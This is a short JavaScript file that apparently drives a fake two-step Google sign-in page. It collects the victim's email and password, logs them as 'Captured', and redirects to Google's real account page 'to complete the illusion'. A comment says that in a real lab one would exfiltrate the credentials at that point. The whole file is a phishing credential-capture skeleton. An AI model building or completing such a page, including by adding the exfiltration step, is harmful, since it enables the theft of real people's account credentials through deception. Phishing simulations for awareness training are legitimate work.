document.getElementById('next-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value;
    if(email) {
        document.getElementById('display-email').innerText = email;
        document.getElementById('email-view').classList.add('exit');
        document.getElementById('email-view').classList.remove('active');
        document.getElementById('password-view').classList.add('active');
    }
});

document.getElementById('login-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    
    // In a real lab scenario, you'd exfiltrate here
    console.log(`Captured: ${email} : ${pass}`);
    
    // Redirect to the real Google to complete the illusion
    window.location.href = "https://myaccount.google.com/";
});
